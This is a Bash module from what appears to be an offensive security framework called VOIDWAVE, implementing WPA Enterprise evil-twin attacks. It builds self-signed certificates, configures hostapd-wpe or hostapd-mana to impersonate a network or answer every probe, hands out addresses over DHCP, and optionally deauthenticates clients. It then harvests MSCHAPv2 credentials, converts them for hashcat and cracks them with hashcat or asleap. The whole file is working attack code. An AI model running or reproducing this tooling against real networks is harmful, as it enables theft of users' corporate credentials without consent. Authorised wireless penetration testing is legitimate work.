#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Enterprise Attacks: WPA Enterprise (EAP) attacks using hostapd-wpe
# ═══════════════════════════════════════════════════════════════════════════════

# Prevent multiple sourcing
[[ -n "${_VOIDWAVE_ENTERPRISE_LOADED:-}" ]] && return 0
readonly _VOIDWAVE_ENTERPRISE_LOADED=1

# Source dependencies
if ! declare -F log_info &>/dev/null; then
    source "${BASH_SOURCE%/*}/../core.sh"
fi

[[ -f "${BASH_SOURCE%/*}/dos.sh" ]] && source "${BASH_SOURCE%/*}/dos.sh"
[[ -f "${BASH_SOURCE%/*}/../wireless/loot.sh" ]] && source "${BASH_SOURCE%/*}/../wireless/loot.sh"

#═══════════════════════════════════════════════════════════════════════════════
# ENTERPRISE CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Working directories
declare -g ENT_WORK_DIR="/tmp/enterprise_$$"
declare -g ENT_HOSTAPD_CONF="${ENT_WORK_DIR}/hostapd-wpe.conf"
declare -g ENT_CREDS_FILE="${ENT_WORK_DIR}/hostapd-wpe.log"
declare -g ENT_CERTS_DIR="${ENT_WORK_DIR}/certs"

# Network settings
declare -g ENT_IP_RANGE="${ENT_IP_RANGE:-192.168.87}"
declare -g ENT_GATEWAY="${ENT_GATEWAY:-192.168.87.1}"
declare -g ENT_NETMASK="${ENT_NETMASK:-255.255.255.0}"

# Process tracking
declare -g _ENT_HOSTAPD_PID=""
declare -g _ENT_DHCP_PID=""
declare -g _ENT_RADIUS_PID=""

# Captured credentials storage
declare -gA ENT_CAPTURED_CREDS=()

#═══════════════════════════════════════════════════════════════════════════════
# CERTIFICATE GENERATION
#═══════════════════════════════════════════════════════════════════════════════

# Generate self-signed certificates for RADIUS
# Args: $1 = common name (default: "Corporate WiFi")
ent_generate_certs() {
    local cn="${1:-Corporate WiFi}"

    mkdir -p "$ENT_CERTS_DIR"

    log_info "Generating certificates for '$cn'"

    # Generate CA key and cert
    openssl genrsa -out "$ENT_CERTS_DIR/ca.key" 2048 2>/dev/null

    openssl req -new -x509 -days 365 -key "$ENT_CERTS_DIR/ca.key" \
        -out "$ENT_CERTS_DIR/ca.pem" -subj "/CN=$cn CA" 2>/dev/null

    # Generate server key and cert
    openssl genrsa -out "$ENT_CERTS_DIR/server.key" 2048 2>/dev/null

    openssl req -new -key "$ENT_CERTS_DIR/server.key" \
        -out "$ENT_CERTS_DIR/server.csr" -subj "/CN=$cn" 2>/dev/null

    openssl x509 -req -days 365 -in "$ENT_CERTS_DIR/server.csr" \
        -CA "$ENT_CERTS_DIR/ca.pem" -CAkey "$ENT_CERTS_DIR/ca.key" \
        -CAcreateserial -out "$ENT_CERTS_DIR/server.pem" 2>/dev/null

    # Generate DH parameters (smaller for speed)
    openssl dhparam -out "$ENT_CERTS_DIR/dh" 1024 2>/dev/null

    log_success "Certificates generated in $ENT_CERTS_DIR"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# HOSTAPD-WPE CONFIGURATION
#═══════════════════════════════════════════════════════════════════════════════

# Generate hostapd-wpe configuration
# Args: $1 = interface, $2 = SSID, $3 = channel, $4 = EAP type (peap/ttls/all)
ent_generate_config() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"
    local eap_type="${4:-all}"

    mkdir -p "$ENT_WORK_DIR"

    # Check for hostapd-wpe
    local hostapd_bin=""
    if command -v hostapd-wpe &>/dev/null; then
        hostapd_bin="hostapd-wpe"
    elif command -v hostapd-mana &>/dev/null; then
        hostapd_bin="hostapd-mana"
    elif [[ -x "/usr/sbin/hostapd-wpe" ]]; then
        hostapd_bin="/usr/sbin/hostapd-wpe"
    fi

    if [[ -z "$hostapd_bin" ]]; then
        log_error "hostapd-wpe not found"
        return 1
    fi

    # Generate certs if not present
    if [[ ! -f "$ENT_CERTS_DIR/server.pem" ]]; then
        ent_generate_certs "$ssid"
    fi

    # Build EAP types string
    local eap_types=""
    case "$eap_type" in
        peap) eap_types="eap_user_file=$ENT_WORK_DIR/eap_user\n" ;;
        ttls) eap_types="eap_user_file=$ENT_WORK_DIR/eap_user\n" ;;
        all)  eap_types="eap_user_file=$ENT_WORK_DIR/eap_user\n" ;;
    esac

    # Create EAP user file
    cat > "$ENT_WORK_DIR/eap_user" << 'EOF'
# Phase 1 (tunnel)
*           PEAP,TTLS,TLS,FAST
# Phase 2 (inner)
"t"         TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "t" [2]
EOF

    # Generate hostapd-wpe config
    cat > "$ENT_HOSTAPD_CONF" << EOF
# Interface
interface=$iface
driver=nl80211
hw_mode=g
channel=$channel

# SSID
ssid=$ssid

# Enable WPA2 Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

# IEEE 802.1X / RADIUS
ieee8021x=1
eapol_version=2
eap_server=1
eap_user_file=$ENT_WORK_DIR/eap_user

# Certificates
ca_cert=$ENT_CERTS_DIR/ca.pem
server_cert=$ENT_CERTS_DIR/server.pem
private_key=$ENT_CERTS_DIR/server.key
private_key_passwd=
dh_file=$ENT_CERTS_DIR/dh

# Logging
wpe_logfile=$ENT_CREDS_FILE

# EAP types to accept
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=$ssid
eap_fast_prov=3
pac_key_lifetime=604800
pac_key_refresh_time=86400
EOF

    log_debug "Generated hostapd-wpe config: $ENT_HOSTAPD_CONF"
    return 0
}

#═══════════════════════════════════════════════════════════════════════════════
# HOSTAPD-WPE MANAGEMENT
#═══════════════════════════════════════════════════════════════════════════════

# Start hostapd-wpe
# Args: $1 = interface, $2 = SSID, $3 = channel
ent_start_hostapd() {
    local iface="$1"
    local ssid="$2"
    local channel="$3"

    # Find hostapd-wpe binary
    local hostapd_bin=""
    for bin in hostapd-wpe hostapd-mana /usr/sbin/hostapd-wpe /usr/local/bin/hostapd-wpe; do
        if command -v "$bin" &>/dev/null || [[ -x "$bin" ]]; then
            hostapd_bin="$bin"
            break
        fi
    done

    if [[ -z "$hostapd_bin" ]]; then
        log_error "hostapd-wpe not found - install from: https://github.com/OpenSecurityResearch/hostapd-wpe"
        return 1
    fi

    ent_stop_hostapd

    # Generate config
    if ! ent_generate_config "$iface" "$ssid" "$channel"; then
        return 1
    fi

    # Configure interface
    ip link set "$iface" down 2>/dev/null
    ip addr flush dev "$iface" 2>/dev/null
    ip link set "$iface" up 2>/dev/null
    ip addr add "${ENT_GATEWAY}/24" dev "$iface" 2>/dev/null

    log_info "Starting hostapd-wpe for SSID: $ssid"

    "$hostapd_bin" "$ENT_HOSTAPD_CONF" &> "$ENT_WORK_DIR/hostapd.log" &
    _ENT_HOSTAPD_PID=$!

    sleep 3

    if kill -0 "$_ENT_HOSTAPD_PID" 2>/dev/null; then
        log_success "hostapd-wpe started (PID: $_ENT_HOSTAPD_PID)"
        return 0
    else
        log_error "hostapd-wpe failed to start"
        cat "$ENT_WORK_DIR/hostapd.log" 2>/dev/null
        return 1
    fi
}

# Stop hostapd-wpe
ent_stop_hostapd() {
    if [[ -n "$_ENT_HOSTAPD_PID" ]]; then
        kill "$_ENT_HOSTAPD_PID" 2>/dev/null
        wait "$_ENT_HOSTAPD_PID" 2>/dev/null
        _ENT_HOSTAPD_PID=""
    fi

    pkill -f "hostapd-wpe" 2>/dev/null
    pkill -f "hostapd-mana" 2>/dev/null
}

#═══════════════════════════════════════════════════════════════════════════════
# DHCP SERVER
#═══════════════════════════════════════════════════════════════════════════════

# Start DHCP server
# Args: $1 = interface
ent_start_dhcp() {
    local iface="$1"

    ent_stop_dhcp

    if ! command -v dnsmasq &>/dev/null; then
        log_warning "dnsmasq not found - clients won't get IP addresses"
        return 1
    fi

    local dhcp_conf="$ENT_WORK_DIR/dnsmasq.conf"

    cat > "$dhcp_conf" << EOF
interface=$iface
dhcp-range=${ENT_IP_RANGE}.100,${ENT_IP_RANGE}.200,12h
dhcp-option=3,${ENT_GATEWAY}
dhcp-option=6,8.8.8.8
log-queries
log-dhcp
listen-address=${ENT_GATEWAY}
EOF

    dnsmasq -C "$dhcp_conf" --no-daemon &>/dev/null &
    _ENT_DHCP_PID=$!

    sleep 1

    if kill -0 "$_ENT_DHCP_PID" 2>/dev/null; then
        log_success "DHCP server started"
        return 0
    fi

    return 1
}

# Stop DHCP
ent_stop_dhcp() {
    if [[ -n "$_ENT_DHCP_PID" ]]; then
        kill "$_ENT_DHCP_PID" 2>/dev/null
        wait "$_ENT_DHCP_PID" 2>/dev/null
        _ENT_DHCP_PID=""
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# CREDENTIAL PARSING
#═══════════════════════════════════════════════════════════════════════════════

# Parse hostapd-wpe log for credentials
# Returns: credentials in USERNAME:CHALLENGE:RESPONSE format
ent_parse_credentials() {
    if [[ ! -f "$ENT_CREDS_FILE" ]]; then
        return 1
    fi

    # Look for MSCHAP credentials
    local username challenge response

    while IFS= read -r line; do
        if [[ "$line" =~ username:.* ]]; then
            username=$(echo "$line" | sed -n 's/.*username:[[:space:]]*\(.*\)/\1/p')
        elif [[ "$line" =~ challenge:.* ]]; then
            challenge=$(echo "$line" | sed -n 's/.*challenge:[[:space:]]*\([0-9a-fA-F:]*\).*/\1/p')
        elif [[ "$line" =~ response:.* ]]; then
            response=$(echo "$line" | sed -n 's/.*response:[[:space:]]*\([0-9a-fA-F:]*\).*/\1/p')

            if [[ -n "$username" && -n "$challenge" && -n "$response" ]]; then
                echo "$username:$challenge:$response"
                ENT_CAPTURED_CREDS["$username"]="$challenge:$response"

                # Reset for next credential
                username=""
                challenge=""
                response=""
            fi
        fi
    done < "$ENT_CREDS_FILE"
}

# Get count of captured credentials
ent_get_cred_count() {
    if [[ ! -f "$ENT_CREDS_FILE" ]]; then
        echo 0
        return
    fi

    grep -c "mschapv2:" "$ENT_CREDS_FILE" 2>/dev/null || echo 0
}

# Watch for new credentials
ent_watch_credentials() {
    log_info "Watching for EAP credentials..."

    if [[ ! -f "$ENT_CREDS_FILE" ]]; then
        touch "$ENT_CREDS_FILE"
    fi

    tail -f "$ENT_CREDS_FILE" 2>/dev/null | while read -r line; do
        if [[ "$line" =~ mschapv2:|username: ]]; then
            log_success "CREDENTIAL: $line"
        fi
    done
}

#═══════════════════════════════════════════════════════════════════════════════
# MSCHAP CRACKING
#═══════════════════════════════════════════════════════════════════════════════

# Convert credentials to hashcat format (5500 - NetNTLMv1 / 5600 - NetNTLMv2)
# Args: $1 = username, $2 = challenge, $3 = response
ent_format_hashcat() {
    local username="$1"
    local challenge="$2"
    local response="$3"

    # Remove colons from challenge/response
    challenge="${challenge//:/}"
    response="${response//:/}"

    # Hashcat mode 5500 format: username::::response:challenge
    echo "${username}::::${response}:${challenge}"
}

# Generate hashcat file from captured credentials
# Args: $1 = output file
ent_export_hashcat() {
    local output_file="${1:-$ENT_WORK_DIR/hashes.5500}"

    log_info "Exporting credentials to hashcat format"

    > "$output_file"

    for username in "${!ENT_CAPTURED_CREDS[@]}"; do
        local cred="${ENT_CAPTURED_CREDS[$username]}"
        local challenge="${cred%%:*}"
        local response="${cred#*:}"

        ent_format_hashcat "$username" "$challenge" "$response" >> "$output_file"
    done

    if [[ -s "$output_file" ]]; then
        log_success "Exported to: $output_file"
        log_info "Crack with: hashcat -m 5500 $output_file wordlist.txt"
        return 0
    fi

    log_warning "No credentials to export"
    return 1
}

# Attempt to crack MSCHAP with hashcat
# Args: $1 = hash file, $2 = wordlist
ent_crack_hashcat() {
    local hash_file="$1"
    local wordlist="$2"

    if ! command -v hashcat &>/dev/null; then
        log_error "hashcat not found"
        return 1
    fi

    if [[ ! -f "$hash_file" ]]; then
        log_error "Hash file not found: $hash_file"
        return 1
    fi

    if [[ ! -f "$wordlist" ]]; then
        log_error "Wordlist not found: $wordlist"
        return 1
    fi

    log_info "Cracking MSCHAP hashes with hashcat..."

    hashcat -m 5500 -a 0 "$hash_file" "$wordlist" --force

    # Check for cracked passwords
    local cracked
    cracked=$(hashcat -m 5500 "$hash_file" --show 2>/dev/null)

    if [[ -n "$cracked" ]]; then
        log_success "Cracked credentials:"
        echo "$cracked"
        return 0
    fi

    return 1
}

# Crack with asleap (faster for MSCHAP)
# Args: $1 = challenge, $2 = response, $3 = wordlist
ent_crack_asleap() {
    local challenge="$1"
    local response="$2"
    local wordlist="$3"

    if ! command -v asleap &>/dev/null; then
        log_error "asleap not found"
        return 1
    fi

    log_info "Cracking with asleap..."

    local result
    result=$(asleap -C "$challenge" -R "$response" -W "$wordlist" 2>&1)

    if echo "$result" | grep -q "password:"; then
        local password
        password=$(echo "$result" | sed -n 's/.*password:[[:space:]]*\(.*\)/\1/p')
        log_success "PASSWORD CRACKED: $password"
        return 0
    fi

    log_warning "Password not found in wordlist"
    return 1
}

#═══════════════════════════════════════════════════════════════════════════════
# FULL ENTERPRISE ATTACK
#═══════════════════════════════════════════════════════════════════════════════

# Full enterprise attack
# Args: $1 = AP interface, $2 = deauth interface (optional), $3 = SSID, $4 = BSSID, $5 = channel
ent_attack_full() {
    local ap_iface="$1"
    local deauth_iface="${2:-}"
    local ssid="$3"
    local bssid="$4"
    local channel="$5"

    log_info "Starting Enterprise attack on ${C_WHITE}$ssid${C_RESET}"
    log_info "Target: $bssid (Channel $channel)"

    # Stop any existing attack
    ent_stop_all

    # Create work directory
    mkdir -p "$ENT_WORK_DIR"

    # Start hostapd-wpe
    if ! ent_start_hostapd "$ap_iface" "$ssid" "$channel"; then
        log_error "Failed to start hostapd-wpe"
        return 1
    fi

    # Start DHCP
    ent_start_dhcp "$ap_iface"

    # Start deauth if second interface provided
    if [[ -n "$deauth_iface" && -n "$bssid" ]]; then
        log_info "Starting deauth on $deauth_iface"

        if declare -F dos_deauth &>/dev/null; then
            iwconfig "$deauth_iface" channel "$channel" 2>/dev/null
            dos_deauth "$deauth_iface" "$bssid"
        fi
    fi

    log_success "Enterprise attack running!"
    log_info "Credentials will be logged to: $ENT_CREDS_FILE"
    log_info "Use ent_watch_credentials to monitor in real-time"

    return 0
}

# Karma attack (respond to any SSID probe)
# Args: $1 = interface
ent_attack_karma() {
    local iface="$1"

    log_info "Starting Karma-style enterprise attack"
    log_warning "This will respond to ALL enterprise probe requests"

    # Check for hostapd-mana (has karma support)
    if ! command -v hostapd-mana &>/dev/null; then
        log_error "Karma attack requires hostapd-mana"
        log_info "Install from: https://github.com/sensepost/hostapd-mana"
        return 1
    fi

    mkdir -p "$ENT_WORK_DIR"

    # Generate certs
    ent_generate_certs "Corporate WiFi"

    # Mana config with karma
    cat > "$ENT_HOSTAPD_CONF" << EOF
interface=$iface
driver=nl80211
hw_mode=g
channel=6

ssid=FreeWiFi

wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP

ieee8021x=1
eap_server=1
eap_user_file=$ENT_WORK_DIR/eap_user

ca_cert=$ENT_CERTS_DIR/ca.pem
server_cert=$ENT_CERTS_DIR/server.pem
private_key=$ENT_CERTS_DIR/server.key
dh_file=$ENT_CERTS_DIR/dh

# Mana/Karma options
enable_mana=1
mana_loud=1
mana_wpe=1
mana_credout=$ENT_CREDS_FILE
EOF

    # Create EAP user file
    cat > "$ENT_WORK_DIR/eap_user" << 'EOF'
*           PEAP,TTLS,TLS,FAST
"t"         TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2 "t" [2]
EOF

    # Configure interface
    ip link set "$iface" down 2>/dev/null
    ip addr flush dev "$iface" 2>/dev/null
    ip link set "$iface" up 2>/dev/null
    ip addr add "${ENT_GATEWAY}/24" dev "$iface" 2>/dev/null

    hostapd-mana "$ENT_HOSTAPD_CONF" &> "$ENT_WORK_DIR/mana.log" &
    _ENT_HOSTAPD_PID=$!

    sleep 3

    if kill -0 "$_ENT_HOSTAPD_PID" 2>/dev/null; then
        log_success "Karma attack running"
        ent_start_dhcp "$iface"
        return 0
    else
        log_error "Failed to start Karma attack"
        return 1
    fi
}

#═══════════════════════════════════════════════════════════════════════════════
# STATUS AND CONTROL
#═══════════════════════════════════════════════════════════════════════════════

# Get attack status
ent_status() {
    echo ""
    echo -e "    ${C_CYAN}Enterprise Attack Status${C_RESET}"
    echo -e "    ${C_SHADOW}$(printf '─%.0s' {1..40})${C_RESET}"

    # hostapd-wpe
    if [[ -n "$_ENT_HOSTAPD_PID" ]] && kill -0 "$_ENT_HOSTAPD_PID" 2>/dev/null; then
        echo -e "    hostapd-wpe: ${C_GREEN}Running${C_RESET} (PID: $_ENT_HOSTAPD_PID)"
    else
        echo -e "    hostapd-wpe: ${C_RED}Stopped${C_RESET}"
    fi

    # DHCP
    if [[ -n "$_ENT_DHCP_PID" ]] && kill -0 "$_ENT_DHCP_PID" 2>/dev/null; then
        echo -e "    DHCP:        ${C_GREEN}Running${C_RESET}"
    else
        echo -e "    DHCP:        ${C_RED}Stopped${C_RESET}"
    fi

    # Credentials
    local cred_count
    cred_count=$(ent_get_cred_count)
    echo -e "    Credentials: ${C_WHITE}$cred_count${C_RESET} captured"

    if [[ $cred_count -gt 0 ]]; then
        echo ""
        echo -e "    ${C_YELLOW}Recent captures:${C_RESET}"
        tail -20 "$ENT_CREDS_FILE" 2>/dev/null | grep -E "username:|mschapv2:" | tail -5
    fi

    echo ""
}

# Stop all enterprise processes
ent_stop_all() {
    log_info "Stopping Enterprise attack..."

    ent_stop_hostapd
    ent_stop_dhcp

    if declare -F dos_stop &>/dev/null; then
        dos_stop
    fi

    log_success "Enterprise attack stopped"
}

#═══════════════════════════════════════════════════════════════════════════════
# CLEANUP
#═══════════════════════════════════════════════════════════════════════════════

ent_cleanup() {
    ent_stop_all

    # Save credentials to loot
    if [[ -f "$ENT_CREDS_FILE" ]] && [[ -s "$ENT_CREDS_FILE" ]]; then
        local loot_dir="${WIRELESS_LOOT_ENTERPRISE:-$HOME/.voidwave/loot/wireless/enterprise}"
        mkdir -p "$loot_dir"
        cp "$ENT_CREDS_FILE" "$loot_dir/enterprise_creds_$(date +%Y%m%d_%H%M%S).log"
    fi

    rm -rf "$ENT_WORK_DIR" 2>/dev/null
}

# Register cleanup (uses cleanup registry to prevent trap overwriting)
register_cleanup ent_cleanup

#═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
#═══════════════════════════════════════════════════════════════════════════════

export -f ent_generate_certs ent_generate_config
export -f ent_start_hostapd ent_stop_hostapd
export -f ent_start_dhcp ent_stop_dhcp
export -f ent_parse_credentials ent_get_cred_count ent_watch_credentials
export -f ent_format_hashcat ent_export_hashcat
export -f ent_crack_hashcat ent_crack_asleap
export -f ent_attack_full ent_attack_karma
export -f ent_status ent_stop_all ent_cleanup
